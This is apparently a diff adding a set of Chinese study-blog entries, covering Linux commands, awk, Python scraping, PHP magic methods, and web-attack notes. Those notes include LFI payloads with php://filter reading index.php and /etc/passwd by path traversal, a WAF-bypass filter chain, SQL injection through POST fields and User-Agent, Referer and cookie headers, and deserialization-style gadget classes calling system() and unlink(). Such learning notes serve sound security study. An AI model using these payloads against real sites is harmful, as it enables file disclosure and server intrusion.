+示例：cp file.txt &#x2F;backup&#x2F; 将file.txt复制到&#x2F;backup目录。
+
+
+复制并重命名：cp 源文件 目标目录&#x2F;新文件名
+示例：cp report.doc &#x2F;archive&#x2F;report_20250315.doc。
+
+
+复制目录：需要 -r（递归）选项。
+示例：cp -r &#x2F;home&#x2F;user&#x2F;docs &#x2F;backup&#x2F; 将docs目录及其内容复制到&#x2F;backup。
+
+
+常用选项：
+-i：覆盖前提示。
+-v：显示复制过程。
+示例：cp -iv file1.txt file2.txt &#x2F;target&#x2F; 复制两个文件到&#x2F;target，并显示过程，覆盖前询问。
+
+
+
+七.绝对路径与相对路径
+绝对路径：从根目录 &#x2F; 开始的完整路径，唯一确定文件或目录的位置。
+示例：&#x2F;home&#x2F;user&#x2F;docs&#x2F;report.txt
+
+
+相对路径：相对于当前工作目录的路径。
+示例：假设当前目录是 &#x2F;home&#x2F;user，则 docs&#x2F;report.txt 表示 &#x2F;home&#x2F;user&#x2F;docs&#x2F;report.txt。
+
+
+. 表示当前目录，.. 表示上级目录。
+..&#x2F;pics&#x2F;photo.jpg 表示从当前目录的上级目录进入pics目录找到photo.jpg。
+
+识别：以 &#x2F; 开头的是绝对路径，否则是相对路径。
+八.设置用户密码和root用户密码，切换用户
+设置当前用户密码：
+直接输入 passwd，按提示输入当前密码，然后输入新密码两次。
+
+
+设置root密码（需要root权限）：
+方法1：sudo passwd root（输入当前用户密码后，设置root密码）。
+方法2：先切换到root（su -），然后输入passwd。
+
+
+切换用户：
+su 用户名：切换到指定用户，需要输入该用户密码。环境变量可能不完全加载。
+su - 用户名：切换到指定用户，并加载该用户的环境变量（相当于重新登录）。
+sudo -i：以root身份运行交互式shell（需要当前用户在sudo组）。
+
+
+
+九.使用文本编辑器常用命令行编辑器有 nano 和 vim。
+nano
+打开文件：nano 文件名
+编辑：直接输入内容。
+保存：按 Ctrl+O，然后回车确认文件名。
+退出：按 Ctrl+X。如果文件未保存，会提示保存。
+示例：nano myfile.txt 创建&#x2F;编辑myfile.txt。
+
+
+vim
+打开文件：vim 文件名
+进入插入模式：按 i，此时可输入内容。
+退出插入模式：按 Esc。
+保存并退出：输入 :wq 然后回车。
+不保存退出：输入 :q!。
+示例：vim &#x2F;etc&#x2F;hosts 编辑hosts文件。
+
+
+
+十.打包文件和压缩文件打包与压缩通常结合使用，主要用 tar 命令。
+创建tar包（不压缩）：tar -cvf 包名.tar 文件&#x2F;目录…
+
+示例：tar -cvf backup.tar &#x2F;home&#x2F;user&#x2F;docs 将docs目录打包成backup.tar。
+
+
+创建并压缩（gzip）：tar -czvf 包名.tar.gz 文件&#x2F;目录…
+
+示例：tar -czvf project.tar.gz project&#x2F; 将project目录打包并用gzip压缩。
+
+
+解包&#x2F;解压：
+
+解压tar包：tar -xvf 包名.tar
+解压tar.gz：tar -zxvf 包名.tar.gz
+可指定解压目录：tar -zxvf 包名.tar.gz -C &#x2F;目标路径
+
+  
+
+单独压缩：
+
+zip -r 压缩包.zip 目录 打包成zip（压缩目录时用）。
+unzip 压缩包.zip 解压zip。
+
+
+
+十一.查看基本的日志文件日志文件通常位于 &#x2F;var&#x2F;log&#x2F; 目录下。常用查看方法：
+直接查看：
+cat &#x2F;var&#x2F;log&#x2F;syslog 显示全部。
+less &#x2F;var&#x2F;log&#x2F;syslog 分页查看（按空格翻页，按q退出）。
+tail -n 50 &#x2F;var&#x2F;log&#x2F;syslog 显示最后50行。
+tail -f &#x2F;var&#x2F;log&#x2F;syslog 实时跟踪日志更新（按 Ctrl+C 停止）。
+head -n 20 &#x2F;var&#x2F;log&#x2F;syslog 显示前20行。
+
+
+过滤特定内容：
+grep “error” &#x2F;var&#x2F;log&#x2F;syslog 查找包含”error”的行（不区分大小写加 -i）。
+grep -E “error|fail” &#x2F;var&#x2F;log&#x2F;syslog 同时搜索多个关键词。
+
+
+常用日志文件：
+&#x2F;var&#x2F;log&#x2F;syslog 或 &#x2F;var&#x2F;log&#x2F;messages：系统总日志。
+&#x2F;var&#x2F;log&#x2F;auth.log：认证日志（登录、sudo等）。
+&#x2F;var&#x2F;log&#x2F;kern.log：内核日志。
+&#x2F;var&#x2F;log&#x2F;dmesg：内核环缓冲区信息（可用 dmesg 命令查看）。
+&#x2F;var&#x2F;log&#x2F;boot.log：系统启动日志。
+应用日志如 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log、&#x2F;var&#x2F;log&#x2F;mysql&#x2F;error.log。
+
+
+使用 journalctl（systemd系统）：
+journalctl -xe 查看最近系统日志及解释。
+journalctl -u ssh.service 查看ssh服务日志。
+journalctl –since “1 hour ago” 查看最近1小时日志。
+
+
+
+十二. 常用二进制文件目录
+&#x2F;bin：基本命令（ls, cp等）。
+&#x2F;sbin：系统管理命令（fdisk, ifconfig等）。
+&#x2F;usr&#x2F;bin：大多数用户命令。
+&#x2F;usr&#x2F;sbin：系统管理命令（许多属于root）。
+&#x2F;usr&#x2F;local&#x2F;bin：本地安装的程序。
+&#x2F;opt：可选软件包。
+这些目录通常包含在环境变量 PATH 中，可直接执行其中的程序。
+
+十三. 给文件赋权（修改权限）使用 chmod 命令。
+符号方式：chmod [u&#x2F;g&#x2F;o][+&#x2F;-&#x2F;&#x3D;][r&#x2F;w&#x2F;x] 文件示例：   . chmod u=rwx,g=rx,o=rx 给每个用户设置具体的权限。   · chmod u+x script.txt 给所有者加执行权限。   · chmod g-w file.txt 移除组的写权限。   · chmod o=r file.txt 设置其他用户只有读权限。   · chmod a+x script.txt 给所有用户（所有者、组、其他）加执行权限。
+数字方式：用三位八进制数表示权限（r&#x3D;4, w&#x3D;2, x&#x3D;1）。    示例：    - chmod 755 script.txt 设置权限 rwxr-xr-x（所有者读写执行，组和其他读执行）。    - chmod 644 file.txt 设置 rw-r--r--。- 递归修改目录权限：chmod -R 755 directory/ 将目录及其内部文件都设为755。
+
+十四.运行可执行文件
+运行可执行文件：
+如果文件在当前目录：.&#x2F;可执行文件名（需要执行权限）。
+示例：.&#x2F;hello 运行当前目录下的hello程序。
+
+
+如果文件在PATH环境变量包含的目录中（如&#x2F;bin、&#x2F;usr&#x2F;bin），直接输入文件名即可。
+示例：ls、python3。
+
+
+使用绝对路径或相对路径执行。
+示例：&#x2F;home&#x2F;user&#x2F;bin&#x2F;myapp。
+
+
+如果没有执行权限，先赋予：chmod +x 文件名，再运行。
+对于脚本（如Python、Shell），也可用解释器运行：python3 script.py 或 bash script.sh。
+
+
+
+十五. 递归删除
+rm -r 目录名 删除目录及其所有内容（递归）。示例：rm -r old_project/ 删除old_project目录。
+
+
+rm -rf 目录名 强制递归删除，不提示确认。示例：rm -rf /tmp/cache/ 强制删除/tmp/cache目录。
+
+
+删除文件：rm 文件名。
+安全选项：rm -i 删除前逐个询问，rm -v 显示删除过程。
+危险命令：绝对避免 rm -rf &#x2F; 或 rm -rf &#x2F;*，会删除系统所有文件。
+
+十六.使用 find、grep 查找flagfind 查找文件中flag
+按文件名：find 起始路径 -name “文件名模式”
+示例：find &#x2F;home -name “flag.txt” 在&#x2F;home下查找名为flag.txt的文件。
+
+
+使用通配符：find &#x2F; -name “flag*” 查找所有以flag开头的文件。
+忽略大小写：-iname。
+按文件类型：-type f（普通文件）、-type d（目录）。
+示例：find &#x2F;var&#x2F;log -type f -name “*.log” 查找所有.log文件。
+
+
+按大小：-size +100M 查找大于100M的文件。
+按时间：-mtime -7 7天内修改过的文件。
+执行操作：-exec 对找到的文件执行命令。
+示例：find . -name “*.tmp” -exec rm {} ; 删除所有.tmp文件
+
+
+
+grep 搜索文件内容
+基本搜索：grep “要查找的字符串” 文件
+示例：grep “flag{“ secret.txt ( 在secret.txt中搜索flag{ )。
+
+
+递归搜索目录：grep -r “flag” &#x2F;home&#x2F;user&#x2F; 在&#x2F;home&#x2F;user&#x2F;下所有文件中递归搜索。
+常用选项：
+-i 忽略大小写。
+-l 只显示包含匹配内容的文件名。
+-n 显示行号。
+-v 显示不匹配的行。
+-c 统计匹配行数。
+
+
+
+组合使用 find 和 grep：
+方法1：find &#x2F; -type f -name “*.txt” -exec grep -l “flag” {} ; 查找所有txt文件中包含flag的文件名。
+方法2：grep -r –include&#x3D;”*.txt” “flag” &#x2F; 用grep的–include限制文件类型。
+
+十七.查看当前登录用户的用户名：whoami
+十八.查看网络配置信息ip addrifconfig
+十九.查看进程  ps aux
+输出第一列数据  ps aux | awk &quot;&#123;print $1&#125;&quot;
+二十.查找进程中USER为root的进程ps -u root
+二十一.创建新目录mkdir 文件名
+二十二.添加用户  sudo useradd 用户名
+二十三.主机ssh虚拟机  ssh 用户名@虚拟机IP
+二十四.定时任务cron,每分钟执行新建的shell脚本,结果追加到&#x2F;test.txt  crontab -e]]></content>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>awk脚本的语法</title>
+    <url>/2026/03/25/awk%E8%84%9A%E6%9C%AC%E7%9A%84%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[如何调用脚本一. 使用 -f 选项运行脚本将 awk 命令写入一个文本文件（例如 my.awk），然后用 -f 调用：awk -f my.awk 输入文件1 [输入文件2 ...]
+示例脚本 my.awk:BEGIN &#123; print &quot;开始处理&quot; &#125;&#123; print &quot;行号:&quot; NR, &quot;内容:&quot; $0 &#125;END &#123; print &quot;处理完成&quot; &#125;
+运行：awk -f my.awk data.txt
+二. 让 awk 脚本直接可执行（shebang）在脚本文件的第一行添加 #!&#x2F;usr&#x2F;bin&#x2F;awk -f，然后赋予执行权限。示例脚本 count.awk：#!/usr/bin/awk -f# 统计非空行数量BEGIN &#123; count = 0 &#125;NF &gt; 0 &#123; count++ &#125;END &#123; print &quot;非空行数:&quot;, count &#125;
+赋予权限并运行：chmod +x count.awk./count.awk data.txt
+注意：shebang 中 awk 的路径是 &#x2F;usr&#x2F;bin&#x2F;awk，也可用 #!&#x2F;usr&#x2F;bin&#x2F;env awk -f 以增强可移植性。三. 在脚本中处理多个文件awk -f script.awk file1.txt file2.txt
+
+四. 向脚本传递变量使用 -v 选项可以在脚本执行前定义变量：awk -f script.awk -v threshold=100 data.txt
+脚本内可直接使用 threshold。五. 结合其他选项
+指定字段分隔符：awk -F, -f script.awk data.csv
+使用多个脚本文件：可以多次使用 -f，如 awk -f common.awk -f main.awk data.txt
+
+六.调试与注意事项
+语法检查：可用 awk -f script.awk –source ‘BEGIN{exit}’ 简单检查，或使用 gawk –lint -f script.awk。
+脚本中的注释：以 # 开头，直到行末。
+换行与分号：语句之间可用分号分隔，也可换行。
+函数定义：支持自定义函数，放在脚本中适当位置。
+
+awk脚本的结构和语法一.脚本的基本结构BEGIN &#123; 初始化操作 &#125;            # 在处理任何输入行之前执行/正则/ &#123; 匹配时执行的动作 &#125;     # 匹配正则的行条件表达式 &#123; 动作 &#125;             # 条件为真时执行END &#123; 汇总操作 &#125;               # 所有输入行处理完后执行
+示例：BEGIN &#123; FS=&quot;:&quot;; print &quot;开始处理&quot; &#125;$3 &gt;= 1000 &#123; print $1, $3 &#125;END &#123; print &quot;处理完成&quot; &#125;
+二.变量与内置变量内置变量（部分）
+
+
+变量
+含义
+
+
+
+$0
+当前整行
+
+
+$n
+第n个字段
+
+
+NF
+当前行字段数
+
+
+NR
+当前行号（所有文件累计）
+
+
+FNR
+当前文件内行号
+
+
+FS
+输入字段分隔符（默认空格或制表符）
+
+
+OFS
+输出字段分隔符（默认空格）
+
+
+RS
+输入记录分隔符（默认换行）
+
+
+ORS
+输出记录分隔符（默认换行）
+
+
+ARGC, ARGV
+命令行参数数组
+
+
+FILENAME
+当前输入文件名
+
+
+三.用户自定义变量变量名由字母、数字、下划线组成，区分大小写，无需显式声明，默认值为空字符串或0。BEGIN &#123; count = 0 &#125;&#123; count++ &#125;END &#123; print &quot;总行数:&quot;, count &#125;
+运算符
+算术：+、 -、 *、 &#x2F;、 %、 ^（^ 为乘方）
+
+字符串连接：空格, “a” “b” 得 “ab”
+
+赋值：&#x3D;、 +&#x3D;、 -&#x3D;、 *&#x3D;、 &#x2F;&#x3D;、 %&#x3D;、 ^&#x3D;
+
+比较：&#x3D;&#x3D;、 !&#x3D;、 &gt;、 &lt;、 &gt;&#x3D;、 &lt;&#x3D;（字符串比较按字典序）
+
+逻辑：&amp;&amp;、||、!
+
+三元：条件 ? 表达式1 : 表达式2
+
+
+四.控制语句if-elseif (条件) &#123;    语句&#125; else if (条件) &#123;    语句&#125; else &#123;    语句&#125;
+while&#x2F;do-whilewhile (条件) 语句do 语句 while (条件)
+for循环for (初始化; 条件; 迭代) 语句for (i in 数组) 语句   # 遍历数组下标
+未完待续
+]]></content>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php伪协议</title>
+    <url>/2026/05/05/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[php伪协议的作用
+PHP 内置了多种 流封装器（Stream Wrappers），用于处理不同的输入&#x2F;输出方式。它们像“协议”一样，允许你用 协议名:&#x2F;&#x2F; 的格式访问各种数据源。
+
+常见的php伪协议
+
+
+伪协议
+作用
+
+
+
+file://
+访问本地文件系统（默认）
+
+
+http:// &#x2F; https://
+访问 HTTP 网络资源
+
+
+php://input
+读取原始 POST 数据（常用于 getshell）
+
+
+php://filter
+对本地文件进行读&#x2F;写时应用过滤器
+
+
+php://stdin &#x2F; php://stdout
+标准输入&#x2F;输出流
+
+
+data://
+将 base64 或纯文本当作文件处理
+
+
+zip:// &#x2F; phar://
+访问压缩包内的文件
+
+
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php的结构php://filter/convert.base64-encode/resource=index.php│            │                       │└─主协议     └─过滤器                 └─目标资源（要读取的文件）
+
+php:&#x2F;&#x2F;filter：固定协议头。
+
+convert.base64-encode：过滤器，告诉 PHP 在读取文件内容后，对数据进行 base64_encode() 编码。
+
+resource&#x3D;index.php：目标文件，即要读取的原始文件路径。
+
+
+base64 编码的作用
+如果不加过滤器，当 include 或 require 包含一个 PHP 文件时，PHP 会 直接执行该文件中的 PHP 代码，而不是返回源代码。例如 include(‘index.php’) 会运行 index.php 里的逻辑，无法看到其中的 PHP 标签内的内容。而 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode 会把 文件原始内容（包括  标签）视为字符串，进行 base64 编码后再交给 include。由于 base64 编码后的内容不包含 &lt;?php 标签，PHP 不会执行它，只会输出编码后的字符串。收到该字符串后手动解码，就可以得到完整的源码。
+
+使用场景
+本地文件包含（LFI）漏洞的利用
+
+
+目标存在 include($_GET[‘page’]) 或 file_get_contents($_GET[‘file’]) 等函数。
+
+想读取源码（而不是执行），就用 php:&#x2F;&#x2F;filter。
+
+如果想执行任意 PHP 代码，可以用 php:&#x2F;&#x2F;input、data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等。
+
+
+
+绕过文件扩展名限制
+
+
+有些程序会自动拼接后缀（如 .php），php:&#x2F;&#x2F;filter 不受后缀影响（因为过滤器本身不依赖扩展名）。
+
+例如：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 可以直接读取 &#x2F;etc&#x2F;passwd。
+
+
+
+多过滤器链式处理
+
+
+可以叠加多个过滤器，例如：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode|convert.base64-decode&#x2F;resource&#x3D;index.php（先编码再解码，最后得到原始内容，有时用于绕过 WAF）
+
+]]></content>
+      <tags>
+        <tag>php伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python爬虫</title>
+    <url>/2026/03/24/python%E7%88%AC%E8%99%AB/</url>
+    <content><![CDATA[一. 爬虫的基本原理工作流程
+发送请求：向目标网站发送HTTP请求
+获取响应：接收网站返回的HTML、JSON等数据
+解析数据：提取有用的信息
+存储数据：将提取的数据保存到本地或数据库
+持续爬取：根据需要继续爬取下一个页面
+
+二. HTTP协议基础
+请求方法：GET（获取资源）、POST（提交数据）、PUT（更新资源）、DELETE（删除资源）等
+请求头：包含User-Agent、Cookie、Referer等信息
+响应状态码：200（成功）、404（未找到）、403（禁止访问）、500（服务器错误）等
+
+三. 常用的Python爬虫库1.requests - 发送HTTP请求import requestsurl = &quot;https://www.example.com&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36&quot;&#125;response = requests.get(url, headers=headers)print(response.status_code)print(response.text)
+
+2.BeautifulSoup - 解析HTMLfrom bs4 import BeautifulSouphtml = response.textsoup = BeautifulSoup(html, &quot;html.parser&quot;)# 查找元素title = soup.find(&quot;title&quot;).textlinks = soup.find_all(&quot;a&quot;)for link in links:    print(link.get(&quot;href&quot;))
+3. re - 正则表达式import requestsimport reurl = &quot;https://read.douban.com/charts/science_fiction?dcs=charts&amp;dcm=ranking-nav&quot;headers= &#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0&#x27;&#125;rest = requests.get(url,headers=headers)rest.encoding=&quot;utf-8&quot;text=rest.text#print(text)obj = re.compile(r&#x27;&lt;div class=&quot;title&quot;&gt;(?P&lt;title&gt;.*?)&lt;/div&gt;&#x27;                 r&#x27;&lt;div class=&quot;author&quot;&gt;&lt;a href=&quot;/author/(.*?)/&quot;&gt;(?P&lt;author&gt;.*?)&lt;/a&gt;&lt;/div&gt;&lt;div&#x27;,re.S)result = obj.finditer(text)for item in result:    t=item.group(&#x27;title&#x27;)    a=item.group(&#x27;author&#x27;)    print(f&quot;作者 : &#123;a&#125; ; 书名 : &#123;t&#125;&quot;)     
+
+四. 爬虫的基本流程1 分析目标网站
+了解网站结构和数据加载方式
+检查robots.txt文件，了解网站的爬取规则
+分析网页源代码，确定数据提取方式
+
+2 编写爬虫代码
+发送HTTP请求获取页面内容
+解析页面，提取有用信息
+处理反爬虫机制
+存储爬取的数据
+
+3 测试和优化
+测试爬虫的稳定性和效率
+优化爬取策略，避免被封IP
+处理异常情况，提高爬虫的健壮性
+
+五. 反爬虫机制及应对策略
+IP限制：使用代理IP、降低请求频率（待学）
+User-Agent检测：使用真实的浏览器User-Agent
+Cookie验证：模拟登录，保持会话（待学）
+验证码：使用OCR技术或人工识别（待学）
+
+六. 实例代码 - 爬取豆瓣读书作者与其作品import requestsimport  refrom bs4 import BeautifulSoupurl =&quot;https://read.douban.com/charts/mystery_fiction?dcs=charts&amp;dcm=ranking-nav&quot; header=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0&#x27;&#125;rest = requests.get(url,headers=header)rest.encoding=&quot;utf-8&quot;text=rest.textsouce = BeautifulSoup(text,&#x27;html.parser&#x27;)li = souce.find_all(&quot;li&quot;)f=open(&quot;豆瓣.txt&quot;,mode=&quot;w&quot;,encoding=&quot;utf-8&quot;)for a in li:    name=a.find(&quot;div&quot;,attrs=&#123;&quot;class&quot;:&quot;title&quot;&#125;)    div=a.find(&quot;a&quot;)    if div!=None:        h=div.get(&quot;href&quot;)        na=div.text        url2=&quot;https://read.douban.com&quot;        url3=url2+h        rest2=requests.get(url3,headers=header)        rest2.encoding=&quot;utf-8&quot;        souce2 = BeautifulSoup(rest2.text,&#x27;html.parser&#x27;)        gz=souce2.find(&quot;div&quot;,attrs=&#123;&quot;class&quot;:&quot;followed-number&quot;&#125;)        gz=gz.text        zp=souce2.find(&quot;div&quot;,attrs=&#123;&quot;class&quot;:&quot;title&quot;&#125;)        zp_text=zp.find(&quot;a&quot;).text        zp_link=zp.find(&quot;a&quot;).get(&quot;href&quot;)        print(&quot;作者:&quot;+na+&quot;  &quot;+&quot;关注:&quot;+gz+&quot;  &quot;)        print(&quot;作品:&quot;+zp_text+&quot;  &quot;+&quot;作品链接:&quot;+zp_link)        f.write(&quot;作者:&quot;+na+&quot;  &quot;+&quot;关注:&quot;+gz+&quot;  &quot;+&quot;\n&quot;+&quot;作品:&quot;+zp_text+&quot;  &quot;+&quot;作品链接:&quot;+zp_link+&quot;\n&quot;)f.close()
+
+
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入二</title>
+    <url>/2026/04/22/sql%E6%B3%A8%E5%85%A5%E4%BA%8C/</url>
+    <content><![CDATA[一.Post注入步骤1. 一开始先用admin万能账号与and或任意字符与or判断闭合方式和注点2. 账号和密码之间的post数据用&amp;连接起来，且都必填，如果有submit传输，则要连接submit的值3. 之后在账号或密码中注入sql语句，方式与之前字符型注入相同4. post注入一般是报错注入或盲注实例
+二.Uagent请求头注入适用场景
+网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时uagent请求头未被过滤或拦截。
+步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的uagent请求头3. 发送请求包，查看响应结果4.一般为报错注入实例
+三.Refer请求头注入与Uagent请求头注入相同适用场景
+网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时refer请求头未被过滤或拦截。
+步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的refer请求头3. 发送请求包，查看响应结果4.一般为报错注入四.cookie注入适用场景
+网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时cookie未被过滤或拦截。
+步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的cookie3. 发送请求包，查看响应结果4.一般为报错注入实例
+]]></content>
+  </entry>
+  <entry>
+    <title>php魔术方法</title>
+    <url>/2026/05/09/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[一.__construct() – 构造函数1.一、定义与触发条件__construct() 是 PHP 类中最常见的魔术方法，在使用 new 关键字实例化对象时自动调用。它通常用于初始化对象的属性、建立数据库连接等。触发 __construct() 的情况：
+$obj &#x3D; new ClassName();
+
+$obj &#x3D; new ClassName($arg1, $arg2);
+
+反射实例化 (new ReflectionClass(‘ClassName’))-&gt;newInstance();
+
+注意：unserialize() 不会触发 __construct()（反序列化时触发的是 __wakeup()）。
+
+
+2.代码示例：class Database &#123;    private $dsn;    private $pdo;        public function __construct($dsn) &#123;        echo &quot;构造函数被调用，DSN = $dsn\n&quot;;        $this-&gt;dsn = $dsn;        $this-&gt;pdo = new PDO($dsn);    &#125;&#125;$db = new Database(&#x27;mysql:host=localhost;dbname=test&#x27;);// 输出：构造函数被调用，DSN = mysql:host=localhost;dbname=test
+二.__destruct() – 析构函数1.定义与触发条件当对象的引用计数归零、脚本执行结束、或显式调用 unset($obj) 时，PHP 会调用 __destruct()。它用于释放资源（关闭文件、断开连接等）。触发 __destruct() 的情况：
+脚本结束时所有仍存活的对象。
+
+unset($obj) &#x2F; $obj &#x3D; null。
+
+对象超出作用域（例如函数返回时局部变量销毁）。
+
+重要：即使反序列化过程抛出异常，__destruct() 仍会在对象销毁时执行。
+
+
+2.代码示例；class TempFile &#123;    public $filename;    public function __construct($name) &#123;        $this-&gt;filename = $name;    &#125;    public function __destruct() &#123;        echo &quot;删除临时文件: &#123;$this-&gt;filename&#125;\n&quot;;        unlink($this-&gt;filename);  // ⚠️ 危险操作    &#125;&#125;$file = new TempFile(&#x27;/tmp/session.txt&#x27;);unset($file); // 输出：删除临时文件: /tmp/session.txt
+三. __wakeup() – 反序列化唤醒1.定义与触发条件__wakeup() 是专门为 unserialize() 设计的魔术方法，在反序列化操作恢复对象的所有属性之后、返回对象之前自动调用。常用于重建数据库连接、初始化缓存等。触发条件：
+仅当调用 unserialize() 且对象所属的类定义了 __wakeup() 时触发。
+
+PHP 5.6.0 ~ 7.0.0 存在绕过漏洞：当序列化字符串中声明的属性数量大于实际属性数量时，__wakeup() 不会被调用（CVE-2016-7124）。PHP 7.4+ 已修复，但老旧环境仍受影响。
+
+
+class Connection &#123;    private $dsn;    private $pdo;        public function __wakeup() &#123;        echo &quot;反序列化后重新连接数据库: $this-&gt;dsn\n&quot;;        $this-&gt;pdo = new PDO($this-&gt;dsn);    &#125;&#125;$serialized = &#x27;O:10:&quot;Connection&quot;:1:&#123;s:8:&quot;\0Connection\0dsn&quot;;s:26:&quot;mysql:host=localhost;dbname=test&quot;;&#125;&#x27;;unserialize($serialized);// 输出：反序列化后重新连接数据库: mysql:host=localhost;dbname=test
+
+四.__sleep() – 序列化前清理1.定义与触发条件__sleep() 在调用 serialize() 函数时自动触发，执行完毕后必须返回一个包含需要序列化的属性名称的数组。通常用于清理不需要保存的资源（如数据库连接）。触发条件：
+仅当调用 serialize($obj) 且类定义了 __sleep() 时触发。
+
+class User &#123;    public $username;    public $password;    private $db;        public function __sleep() &#123;        echo &quot;序列化前执行 __sleep\n&quot;;        // 只序列化 username 和 password，忽略 db 连接资源        return [&#x27;username&#x27;, &#x27;password&#x27;];    &#125;&#125;$u = new User();$u-&gt;username = &#x27;admin&#x27;;$u-&gt;password = &#x27;123456&#x27;;$s = serialize($u);// 输出：序列化前执行 __sleep// 序列化结果不包含 db 属性
+五.__toString() – 字符串化陷阱1.定义与触发条件当对象被当作字符串使用时，PHP 会自动调用 __toString() 方法。常见触发场景：
+echo $obj; &#x2F; print $obj;
+
+$str &#x3D; “前缀” . $obj;
+
+$len &#x3D; strlen($obj);
+
+printf(“%s”, $obj);
+
+$obj . ‘’（字符串拼接）
+
+
+触发条件：
+对象被隐式或显式转换为字符串。
+
+必须返回一个字符串，否则抛出致命错误。
+
+
+2.代码示例：class FileReader &#123;    public $filename = &#x27;/etc/passwd&#x27;;    public function __toString() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;$obj = new FileReader();echo $obj;   // 输出 /etc/passwd 的内容
+六.__invoke() – 对象函数化1.定义与触发条件当对象被当作函数调用时，PHP 会执行 __invoke() 方法。触发条件：
+$obj($arg1, $arg2, …);
+
+call_user_func($obj, $arg1);
+
+任何将对象作为回调函数使用的场景。
+
+
+2.代码示例：class Executor &#123;    public $command;    public function __invoke($arg = null) &#123;        system($this-&gt;command . &#x27; &#x27; . $arg);    &#125;&#125;$e = new Executor();$e-&gt;command = &#x27;ls&#x27;;$e(&#x27;-la&#x27;);  // 调用 __invoke(&#x27;-la&#x27;) → 执行 ls -la
+七. __call() 和 __callStatic() – 方法拦截1.定义与触发条件
+__call($method, $args)：当调用一个对象中不存在或不可访问的实例方法时触发。
+
+__callStatic($method, $args)：当以静态方式调用一个类中不存在或不可访问的静态方法时触发。
+
+
+触发条件示例：$obj-&gt;unknownMethod($a, $b);       // 触发 __callClassName::unknownStatic($a, $b);  // 触发 __callStatic
+
+2.代码示例：class Router &#123;    public function __call($name, $arguments) &#123;        echo &quot;调用不存在的方法: $name，参数: &quot; . implode(&#x27;,&#x27;, $arguments) . &quot;\n&quot;;        // 危险：动态调用函数        call_user_func_array($this-&gt;fallback, $arguments);    &#125;&#125;$r = new Router();$r-&gt;anyMethod(&#x27;test&#x27;);  // 输出调用信息，并执行 fallback
+八. __get() 和 __set() – 属性访问拦截1.定义与触发条件
+__get($name)：当读取不可访问的属性（未定义、private、protected）时触发。
+
+__set($name, $value)：当给不可访问的属性赋值时触发。
+
+
+触发条件：$obj-&gt;unknownProp;         // 触发 __get$obj-&gt;privateProp = 123;   // 触发 __set（从类外部访问 private 属性）
+2.代码示例：class DataContainer &#123;    private $data = [];        public function __get($name) &#123;        echo &quot;读取属性: $name\n&quot;;        return $this-&gt;data[$name] ?? null;    &#125;        public function __set($name, $value) &#123;        echo &quot;设置属性: $name = $value\n&quot;;        $this-&gt;data[$name] = $value;    &#125;&#125;$obj = new DataContainer();$obj-&gt;username = &#x27;admin&#x27;;   // 触发 __setecho $obj-&gt;username;        // 触发 __get
+九. __unset() – 属性销毁拦截1.定义与触发条件
+当对不可访问的属性使用 unset() 时，PHP 会调用 __unset($name)。
+
+触发条件：unset($obj-&gt;unknownProp);     // 触发 __unsetunset($obj-&gt;privateProp);     // 从外部 unset 私有属性触发
+2.代码示例：class FileHandler &#123;    private $tempFile;    public function __unset($name) &#123;        if ($name === &#x27;tempFile&#x27;) &#123;            unlink($this-&gt;tempFile);   // 危险操作        &#125;    &#125;&#125;$obj = new FileHandler();unset($obj-&gt;tempFile);  // 触发 __unset → 删除文件
+十. __clone() – 克隆拦截一、定义与触发条件
+当使用 clone $obj 复制对象时，新对象创建完成后会调用 __clone() 方法。
+
+2.代码示例：class Singleton &#123;    public $config;    public function __clone() &#123;        $this-&gt;config = clone $this-&gt;config;    &#125;&#125;
+十一. __debugInfo() – 调试输出拦截一、定义与触发条件
+当使用 var_dump($obj) 或 print_r($obj) 打印对象时，若类定义了 __debugInfo()，PHP 会调用它并显示返回的数组，而不是对象的全部属性。
+
+2.代码示例：class User &#123;    private $password = &#x27;secret&#x27;;    public function __debugInfo() &#123;        return [&#x27;password&#x27; =&gt; &#x27;***&#x27;];    &#125;&#125;var_dump(new User());  // 显示 password =&gt; &#x27;***&#x27;
+十二. __isset() 魔术方法详解1.定义与触发条件__isset() 是 PHP 中用于属性重载（Property Overloading）的魔术方法。当对一个不可访问的属性调用 isset() 或 empty() 函数时，PHP 会自动调用该方法。触发 __isset() 的几种情况（满足任意一条即会触发）：
+
+
+属性状态
+示例
+是否触发 __isset()
+
+
+
+属性未定义
+$obj-&gt;foobar
+✅ 触发
+
+
+属性为 private &#x2F; protected，从类外部访问
